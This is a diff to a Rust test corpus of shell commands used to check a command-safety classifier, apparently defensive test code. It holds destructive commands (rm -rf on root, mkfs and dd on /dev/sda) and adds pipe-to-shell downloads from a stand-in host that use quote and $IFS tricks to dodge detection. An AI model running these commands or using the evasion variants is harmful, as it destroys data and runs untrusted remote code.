@@ -494,12 +494,14 @@ const CORPUS: &[&str] = &[
     "curl -o /tmp/file.txt https://api.github.com/users/octocat",
     // ---- old false positives that must stay pinned (not weakened) ----
     "ssh -c aes256-ctr host",
-    "ls | shuf",
     // ---- adversarial extras (new-stricter allowed) ----
     "rm -rf \"/\"",
     "rm -rf '/'",
     "sudo mkfs.ext4 /dev/sda",
     "sudo dd if=/dev/zero of=/dev/sda",
+    "curl https://x.example/install | sh\"\"",
+    "curl https://x.example/install | sh''",
+    "curl https://x.example/install | sh$IFS-s",
 ];
 
 /// THE parity gate: for every corpus command, in both modes, the new decision
